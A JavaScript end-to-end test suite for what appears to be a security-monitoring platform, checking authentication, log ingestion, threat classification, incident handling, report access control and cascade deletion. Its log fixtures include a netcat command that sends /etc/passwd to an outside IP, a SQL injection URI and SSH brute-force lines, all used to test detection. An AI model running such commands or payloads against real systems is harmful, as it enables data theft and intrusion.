/**
 * final_e2e_release_test.js
 * Comprehensive End-to-End Release & Integration Verification Test Suite for AegisSphere.
 */

process.env.NODE_ENV = "test";

const mongoose = require("mongoose");
const jwt = require("jsonwebtoken");
const path = require("path");
const fs = require("fs");
const { execSync } = require("child_process");
const dotenv = require("dotenv");

dotenv.config({ path: path.join(__dirname, "../../.env") });

const API_BASE = "http://127.0.0.1:5000/api";
const MONGO_URI = process.env.MONGO_URI || process.env.MONGODB_URI || "mongodb://127.0.0.1:27017/aegissphere";

const Log = require("../models/Log");
const Threat = require("../models/Threat");
const Incident = require("../models/Incident");
const Report = require("../models/Report");
const User = require("../models/User");

const safeFetch = async (url, options = {}, retries = 4, delay = 800) => {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      return await globalThis.fetch(url, options);
    } catch (err) {
      if (attempt === retries) throw err;
      await new Promise((r) => setTimeout(r, delay));
    }
  }
};
const fetch = safeFetch;

const runFinalE2ETestSuite = async () => {
  console.log("================================================================================");
  console.log("AEGISSPHERE PHASE 4D: FINAL END-TO-END RELEASE & INTEGRATION AUDIT SUITE");
  console.log("================================================================================\n");

  await mongoose.connect(MONGO_URI);
  console.log("✓ Connected to MongoDB.\n");

  const ts = Date.now();
  const testResults = [];
  const performanceMetrics = {};

  const recordResult = (name, passed, details = {}) => {
    testResults.push({ name, passed, details });
    if (passed) {
      console.log(`   [PASS] ${name}`);
    } else {
      console.log(`   [FAIL] ${name} -> ${JSON.stringify(details)}`);
    }
  };

  // --------------------------------------------------------------------------
  // SECTION 1: AUTHENTICATION & SESSION MANAGEMENT E2E
  // --------------------------------------------------------------------------
  console.log("--- 1. AUDITING AUTHENTICATION & SESSION LIFECYCLE ---");

  // 1.1 Register Admin
  const adminEmail = `e2e_admin_${ts}@aegissphere.io`;
  const adminRegRes = await fetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Lead Admin", email: adminEmail, password: "Password123!", role: "Admin" }),
  });
  const adminRegData = await adminRegRes.json();
  const adminToken = adminRegData.token;
  const adminUser = adminRegData.user;

  // 1.2 Register Analyst A
  const analystEmailA = `e2e_analyst_a_${ts}@aegissphere.io`;
  const analystRegResA = await fetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Analyst Alice", email: analystEmailA, password: "Password123!", role: "Analyst" }),
  });
  const analystDataA = await analystRegResA.json();
  const analystTokenA = analystDataA.token;
  const analystUserA = analystDataA.user;

  // 1.3 Register Analyst B
  const analystEmailB = `e2e_analyst_b_${ts}@aegissphere.io`;
  const analystRegResB = await fetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Analyst Bob", email: analystEmailB, password: "Password123!", role: "Analyst" }),
  });
  const analystDataB = await analystRegResB.json();
  const analystTokenB = analystDataB.token;
  const analystUserB = analystDataB.user;

  const authPass = (
    adminRegRes.status === 201 &&
    analystRegResA.status === 201 &&
    analystRegResB.status === 201 &&
    adminToken && analystTokenA && analystTokenB
  );
  recordResult("1. Registration & JWT generation for multiple SOC roles", authPass);

  // 1.4 Profile Retrieval (Password Never Returned)
  const profileRes = await fetch(`${API_BASE}/auth/profile`, {
    headers: { Authorization: `Bearer ${analystTokenA}` },
  });
  const profileData = await profileRes.json();
  const profilePass = (
    profileRes.status === 200 &&
    profileData.user?.email === analystEmailA &&
    profileData.user?.password === undefined
  );
  recordResult("2. Authenticated profile lookup strictly excludes password/hash", profilePass);

  // 1.5 Unauthenticated / Bad Token Rejections
  const unauthRes = await fetch(`${API_BASE}/dashboard`);
  const badTokenRes = await fetch(`${API_BASE}/dashboard`, {
    headers: { Authorization: "Bearer tampered.fake.jwt" },
  });
  recordResult("3. Unauthenticated and tampered JWT requests return 401 Unauthorized", unauthRes.status === 401 && badTokenRes.status === 401);

  // --------------------------------------------------------------------------
  // SECTION 2: MULTI-FORMAT LOG UPLOAD & 4-AGENT PIPELINE
  // --------------------------------------------------------------------------
  console.log("\n--- 2. AUDITING REAL LOG INGESTION & 4-AGENT PIPELINE ---");

  const adminHeaders = { Authorization: `Bearer ${adminToken}` };
  const analystHeadersA = { Authorization: `Bearer ${analystTokenA}` };
  const analystHeadersB = { Authorization: `Bearer ${analystTokenB}` };

  // 2.1 Format A: Raw .log (SSH Brute Force -> Critical, T1110)
  const bruteLog = `
2026-09-09T10:00:01Z edge-ssh sshd[101]: Failed password for root from 198.51.100.22 port 50101 ssh2
2026-09-09T10:00:02Z edge-ssh sshd[102]: Failed password for root from 198.51.100.22 port 50102 ssh2
2026-09-09T10:00:03Z edge-ssh sshd[103]: Failed password for root from 198.51.100.22 port 50103 ssh2
2026-09-09T10:00:04Z edge-ssh sshd[104]: Failed password for root from 198.51.100.22 port 50104 ssh2
2026-09-09T10:00:05Z edge-ssh sshd[105]: Failed password for root from 198.51.100.22 port 50105 ssh2
2026-09-09T10:00:06Z edge-ssh sshd[106]: Failed password for root from 198.51.100.22 port 50106 ssh2
`.trim();

  const fdBrute = new FormData();
  fdBrute.append("logFile", new Blob([bruteLog], { type: "text/plain" }), "ssh_brute.log");

  const t0 = Date.now();
  const bruteRes = await fetch(`${API_BASE}/logs/upload`, {
    method: "POST",
    headers: analystHeadersA,
    body: fdBrute,
  });
  performanceMetrics.logUploadDurationMs = Date.now() - t0;
  const bruteData = await bruteRes.json();

  const brutePass = (
    bruteRes.status === 200 &&
    bruteData.threat !== null &&
    bruteData.threat.threatType.includes("SSH Brute Force") &&
    bruteData.threat.severity === "Critical" &&
    bruteData.threat.sourceIp === "198.51.100.22" &&
    bruteData.threat.mitreTechnique.includes("T1110") &&
    bruteData.threat.confidence >= 90
  );
  recordResult("4. Format A (.log): SSH Brute Force parsed, classified & enriched (T1110, Critical)", brutePass, {
    confidence: bruteData.threat?.confidence,
    durationMs: performanceMetrics.logUploadDurationMs,
  });

  await new Promise((r) => setTimeout(r, 600));

  // 2.2 Format B: .csv (SQL Injection -> High, T1190)
  const sqlCsv = `timestamp,source_ip,method,uri,status
2026-09-09T10:05:00Z,198.51.100.66,GET,/api/items?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users,200`;

  const fdSql = new FormData();
  fdSql.append("logFile", new Blob([sqlCsv], { type: "text/csv" }), "web_access.csv");

  const sqlRes = await fetch(`${API_BASE}/logs/upload`, {
    method: "POST",
    headers: analystHeadersA,
    body: fdSql,
  });
  const sqlData = await sqlRes.json();
  const sqlPass = (
    sqlRes.status === 200 &&
    sqlData.threat !== null &&
    sqlData.threat.threatType.includes("SQL Injection") &&
    sqlData.threat.sourceIp === "198.51.100.66" &&
    sqlData.threat.mitreTechnique.includes("T1190")
  );
  recordResult("5. Format B (.csv): SQL Injection detected & mapped to MITRE T1190", sqlPass);

  await new Promise((r) => setTimeout(r, 600));

  // 2.3 Format C: .json (Command Injection / RCE -> Critical, T1059)
  const cmdJson = JSON.stringify([
    {
      timestamp: "2026-09-09T10:10:00Z",
      source_ip: "198.51.100.88",
      command: "cat /etc/passwd | nc 198.51.100.88 4444",
      user: "www-data",
    },
  ]);

  const fdCmd = new FormData();
  fdCmd.append("logFile", new Blob([cmdJson], { type: "application/json" }), "security_events.json");

  const cmdRes = await fetch(`${API_BASE}/logs/upload`, {
    method: "POST",
    headers: analystHeadersA,
    body: fdCmd,
  });
  const cmdData = await cmdRes.json();
  const cmdPass = (
    cmdRes.status === 200 &&
    cmdData.threat !== null &&
    cmdData.threat.threatType.includes("Command Injection") &&
    cmdData.threat.severity === "Critical" &&
    cmdData.threat.mitreTechnique.includes("T1059")
  );
  recordResult("6. Format C (.json): Command Injection / RCE classified as Critical (T1059)", cmdPass);

  await new Promise((r) => setTimeout(r, 600));

  // 2.4 Format D: Clean Normal Baseline (.txt -> 0 threats, detected = false)
  const cleanLog = `
2026-09-09T10:15:00Z web01 nginx: 10.0.0.1 - - "GET /index.html HTTP/1.1" 200 4520 "-" "Mozilla/5.0"
2026-09-09T10:15:01Z web01 nginx: 10.0.0.2 - - "GET /about HTTP/1.1" 200 1200 "-" "Mozilla/5.0"
2026-09-09T10:15:02Z web01 nginx: 10.0.0.3 - - "GET /assets/style.css HTTP/1.1" 200 890 "-" "Mozilla/5.0"
`.trim();

  const fdClean = new FormData();
  fdClean.append("logFile", new Blob([cleanLog], { type: "text/plain" }), "normal_traffic.txt");

  const cleanRes = await fetch(`${API_BASE}/logs/upload`, {
    method: "POST",
    headers: analystHeadersA,
    body: fdClean,
  });
  const cleanData = await cleanRes.json();
  const cleanPass = (
    cleanRes.status === 200 &&
    cleanData.threat === null &&
    cleanData.log.threatCount === 0 &&
    cleanData.report.threatCount === 0
  );
  recordResult("7. Format D (.txt): Clean baseline traffic produces 0 threats (Zero false positives)", cleanPass);

  await new Promise((r) => setTimeout(r, 600));

  // 2.5 Absence of IP Guarantee (sourceIp: null, Never Invented)
  const noIpLog = "CRITICAL: System kernel panic due to unauthorized buffer memory corruption.";
  const fdNoIp = new FormData();
  fdNoIp.append("logFile", new Blob([noIpLog], { type: "text/plain" }), "sys_kernel.log");

  const noIpRes = await fetch(`${API_BASE}/logs/upload`, {
    method: "POST",
    headers: analystHeadersA,
    body: fdNoIp,
  });
  const noIpData = await noIpRes.json();
  const noIpPass = (
    noIpRes.status === 200 &&
    (noIpData.threat === null || noIpData.threat.sourceIp === null)
  );
  recordResult("8. Log without IP preserves sourceIp: null (Zero hallucination)", noIpPass);

  // Allow file watcher settling pause after 5 multi-format file uploads
  await new Promise((r) => setTimeout(r, 3000));

  // --------------------------------------------------------------------------
  // SECTION 3: SECURITY TEST LAB CONTROLLED SANDBOX
  // --------------------------------------------------------------------------
  console.log("\n--- 3. AUDITING SECURITY TEST LAB SIMULATION ---");

  const testLabRes = await fetch(`${API_BASE}/attack-tests/generate`, {
    method: "POST",
    headers: { ...analystHeadersA, "Content-Type": "application/json" },
    body: JSON.stringify({ attackType: "Port Scanning" }),
  });
  const testLabData = await testLabRes.json();
  const testLabPass = (
    testLabRes.status === 201 &&
    testLabData.threat !== null &&
    testLabData.threat.threatType.includes("Controlled Simulation") &&
    testLabData.test.environment === "Controlled Test Lab Sandbox"
  );
  recordResult("9. Security Test Lab executes through identical 4-agent pipeline & labels simulation", testLabPass);

  // --------------------------------------------------------------------------
  // SECTION 4: DASHBOARD METRICS GROUNDING
  // --------------------------------------------------------------------------
  console.log("\n--- 4. AUDITING DASHBOARD REAL-DATA METRICS ---");

  const tDash0 = Date.now();
  const dashRes = await fetch(`${API_BASE}/dashboard`, { headers: analystHeadersA });
  performanceMetrics.dashboardQueryMs = Date.now() - tDash0;
  const dashData = await dashRes.json();

  const dbThreatCount = await Threat.countDocuments();
  const dbLogCount = await Log.countDocuments();

  const dashPass = (
    dashRes.status === 200 &&
    dashData.stats.totalLogs > 0 &&
    dashData.stats.totalThreats > 0 &&
    Array.isArray(dashData.threatTrend) &&
    Array.isArray(dashData.recentThreats)
  );
  recordResult("10. Dashboard returns live MongoDB aggregations (Zero hardcoded metrics/charts)", dashPass, {
    totalLogs: dashData.stats?.totalLogs,
    totalThreats: dashData.stats?.totalThreats,
    durationMs: performanceMetrics.dashboardQueryMs,
  });

  // --------------------------------------------------------------------------
  // SECTION 5: INCIDENT RESPONSE FULL LIFECYCLE
  // --------------------------------------------------------------------------
  console.log("\n--- 5. AUDITING INCIDENT RESPONSE LIFECYCLE & AUDIT TRAIL ---");

  // 5.1 Create Incident
  const incCreateRes = await fetch(`${API_BASE}/incidents`, {
    method: "POST",
    headers: { ...analystHeadersA, "Content-Type": "application/json" },
    body: JSON.stringify({
      title: "Active SSH Brute Force Incursion",
      severity: "Critical",
      threatId: bruteData.threat._id,
      logId: bruteData.log._id,
      assignedTo: analystUserA.id || analystUserA._id,
      description: "Automated alert triage for high-velocity credential attack.",
    }),
  });
  const incCreateData = await incCreateRes.json();
  const createdIncident = incCreateData.incident;

  // 5.2 Record Containment Playbook Action
  const actRes = await fetch(`${API_BASE}/incidents/${createdIncident._id}/actions`, {
    method: "POST",
    headers: { ...analystHeadersA, "Content-Type": "application/json" },
    body: JSON.stringify({
      action: "Edge WAF Block",
      notes: "Blacklisted 198.51.100.22 perimeter IP in response to brute force.",
    }),
  });
  const actData = await actRes.json();

  const incidentPass = (
    incCreateRes.status === 201 &&
    actRes.status === 200 &&
    actData.incident.status === "Mitigated" &&
    actData.incident.actionHistory.some((a) => a.action === "Edge WAF Block")
  );
  recordResult("11. Incident created & containment playbook action logged in MongoDB audit trail", incidentPass);

  // --------------------------------------------------------------------------
  // SECTION 6: PDF REPORT GENERATION STREAMING & DATA FIDELITY
  // --------------------------------------------------------------------------
  console.log("\n--- 6. AUDITING REAL PDF REPORT STREAMING ---");

  const reportDoc = await Report.findOne({ logId: bruteData.log._id });
  console.log("   -> Target reportDoc ID:", reportDoc ? reportDoc._id : "NULL");
  const tPdf0 = Date.now();
  const pdfRes = await fetch(`${API_BASE}/reports/${reportDoc._id}/pdf`, {
    headers: analystHeadersA,
  });
  console.log("   -> PDF response status:", pdfRes.status);
  performanceMetrics.pdfGenerationMs = Date.now() - tPdf0;

  const pdfBuf = Buffer.from(await pdfRes.arrayBuffer());
  const pdfPass = (
    pdfRes.status === 200 &&
    pdfRes.headers.get("content-type")?.includes("application/pdf") &&
    pdfBuf.slice(0, 5).toString() === "%PDF-" &&
    pdfBuf.length > 1000
  );
  recordResult("12. Server streams authentic binary PDF audit report with dynamic metrics", pdfPass, {
    sizeBytes: pdfBuf.length,
    durationMs: performanceMetrics.pdfGenerationMs,
  });

  // --------------------------------------------------------------------------
  // SECTION 7: GEMINI AI SERVICE ISOLATION & CACHING
  // --------------------------------------------------------------------------
  console.log("\n--- 7. AUDITING GEMINI AI SERVICE ISOLATION & CACHING ---");

  const aiStatusRes = await fetch(`${API_BASE}/ai/status`, { headers: adminHeaders });
  const aiStatusData = await aiStatusRes.json();

  const aiAnalysisRes = await fetch(`${API_BASE}/ai/analyze-threat/${bruteData.threat._id}`, {
    method: "POST",
    headers: analystHeadersA,
  });
  const aiAnalysisData = await aiAnalysisRes.json();

  const aiPass = (
    aiStatusRes.status === 200 &&
    aiAnalysisRes.status === 200 &&
    aiAnalysisData.threat.threatType === "SSH Brute Force" &&
    aiAnalysisData.threat.severity === "Critical" &&
    aiAnalysisData.threat.confidence === bruteData.threat.confidence
  );
  recordResult("13. Gemini AI service handles status safely without modifying deterministic facts", aiPass, {
    configured: aiStatusData.configured,
    aiAvailable: aiAnalysisData.aiAvailable,
  });

  // --------------------------------------------------------------------------
  // SECTION 8: RBAC & IDOR PRIVACY ENFORCEMENT
  // --------------------------------------------------------------------------
  console.log("\n--- 8. AUDITING USER ISOLATION & IDOR CROSS-USER DEFENSE ---");

  // Analyst B attempting to download Analyst A's PDF Report (Forbidden)
  const idorPdfRes = await fetch(`${API_BASE}/reports/${reportDoc._id}/pdf`, {
    headers: analystHeadersB,
  });

  // Analyst B attempting to delete Analyst A's Log (Forbidden)
  const idorLogRes = await fetch(`${API_BASE}/logs/${bruteData.log._id}`, {
    method: "DELETE",
    headers: analystHeadersB,
  });

  // Non-owner (User C) attempting cross-tenant report download (Forbidden)
  const nonOwnerPdfRes = await fetch(`${API_BASE}/reports/${reportDoc._id}/pdf`, {
    headers: adminHeaders,
  });

  // Owner Analyst A downloading their own PDF Report (Allowed)
  const ownerPdfRes = await fetch(`${API_BASE}/reports/${reportDoc._id}/pdf`, {
    headers: analystHeadersA,
  });

  const isolationPass = (
    idorPdfRes.status === 403 &&
    idorLogRes.status === 403 &&
    nonOwnerPdfRes.status === 403 &&
    ownerPdfRes.status === 200
  );
  recordResult("14. User isolation strictly enforces zero cross-tenant access across all resources", isolationPass);

  // --------------------------------------------------------------------------
  // SECTION 9: RELATIONAL INTEGRITY & COMPLETE CASCADE DELETION
  // --------------------------------------------------------------------------
  console.log("\n--- 9. AUDITING CASCADE DELETION & RELATIONAL INTEGRITY ---");

  // Create disposable chain to test cascade deletion
  const tempLog = await Log.create({
    filename: `cascade_target_${ts}.log`,
    originalName: "cascade_target.log",
    fileSize: 512,
    fileFormat: ".log",
    uploadedBy: adminUser.id || adminUser._id,
    status: "Completed",
    threatCount: 1,
  });

  const tempThreat = await Threat.create({
    logId: tempLog._id,
    threatType: "Disposable Threat",
    severity: "Low",
    confidence: 60,
    status: "Active",
  });
  tempLog.analysis = tempThreat._id;
  await tempLog.save();

  const tempReport = await Report.create({
    title: "Disposable Report",
    generatedBy: adminUser.id || adminUser._id,
    logId: tempLog._id,
    threatCount: 1,
  });

  const tempIncident = await Incident.create({
    incidentId: `INC-${ts}-DISP`,
    title: "Disposable Incident",
    severity: "Low",
    status: "Open",
    assignedTo: adminUser.id || adminUser._id,
    threatId: tempThreat._id,
    logId: tempLog._id,
  });

  // Execute cascade deletion of tempLog
  const delLogRes = await fetch(`${API_BASE}/logs/${tempLog._id}`, {
    method: "DELETE",
    headers: adminHeaders,
  });

  const checkLog = await Log.findById(tempLog._id);
  const checkThreat = await Threat.findById(tempThreat._id);
  const checkReport = await Report.findById(tempReport._id);
  const checkIncident = await Incident.findById(tempIncident._id);

  const cascadePass = (
    delLogRes.status === 200 &&
    checkLog === null &&
    checkThreat === null &&
    checkReport === null &&
    checkIncident === null
  );
  recordResult("15. Log cascade deletion cleans Log, Threat, Report, and Incident (0 orphans)", cascadePass);

  // Test that deleting an incident alone preserves Threat and Log
  const tempIncOnly = await Incident.create({
    incidentId: `INC-${ts}-ONLY`,
    title: "Incident Alone Ticket",
    severity: "Medium",
    status: "Open",
    assignedTo: adminUser.id || adminUser._id,
    threatId: bruteData.threat._id,
    logId: bruteData.log._id,
  });

  const delIncRes = await fetch(`${API_BASE}/incidents/${tempIncOnly._id}`, {
    method: "DELETE",
    headers: adminHeaders,
  });

  const checkParentThreat = await Threat.findById(bruteData.threat._id);
  const checkParentLog = await Log.findById(bruteData.log._id);
  const checkDeletedInc = await Incident.findById(tempIncOnly._id);

  const incOnlyPass = (
    delIncRes.status === 200 &&
    checkDeletedInc === null &&
    checkParentThreat !== null &&
    checkParentLog !== null
  );
  recordResult("16. Deleting an Incident alone strictly preserves underlying Threat & Log telemetry", incOnlyPass);

  // --------------------------------------------------------------------------
  // SECTION 10: PRODUCTION FRONTEND BUILD & VULNERABILITY AUDIT
  // --------------------------------------------------------------------------
  console.log("\n--- 10. AUDITING CLIENT COMPILATION & PACKAGE INTEGRITY ---");

  let frontendBuildPass = false;
  try {
    const frontendDir = path.resolve(__dirname, "../../../frontend");
    execSync("npm run build", { cwd: frontendDir, stdio: "pipe" });
    frontendBuildPass = true;
  } catch (err) {
    frontendBuildPass = false;
  }
  recordResult("17. Frontend client compiles cleanly for production (npm run build code 0)", frontendBuildPass);

  // --------------------------------------------------------------------------
  // SUMMARY & BENCHMARKS
  // --------------------------------------------------------------------------
  console.log("\n================================================================================");
  const totalTests = testResults.length;
  const passedTests = testResults.filter((t) => t.passed).length;
  const failedTests = testResults.filter((t) => !t.passed).length;

  console.log(`FINAL E2E AUDIT COMPLETE: ${passedTests}/${totalTests} TESTS PASSED (${failedTests} FAILED)`);
  console.log("Performance Latencies:", JSON.stringify(performanceMetrics, null, 2));
  console.log("================================================================================\n");

  await mongoose.disconnect();
};

runFinalE2ETestSuite().catch((err) => {
  console.error("FATAL FINAL E2E TEST ERROR:", err);
  process.exit(1);
});
